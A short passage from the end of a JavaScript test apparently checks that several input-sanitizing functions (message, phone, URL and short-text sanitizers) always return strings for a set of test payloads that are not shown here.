    assert.equal(typeof sanitizeMessage(payload), 'string');
    assert.equal(typeof sanitizePhone(payload), 'string');
    assert.equal(typeof sanitizeUrl(payload), 'string');
    assert.equal(
      typeof sanitizeShortText(payload, { required: false, maxLength: 10_000 }),
      'string'
    );
  }
});
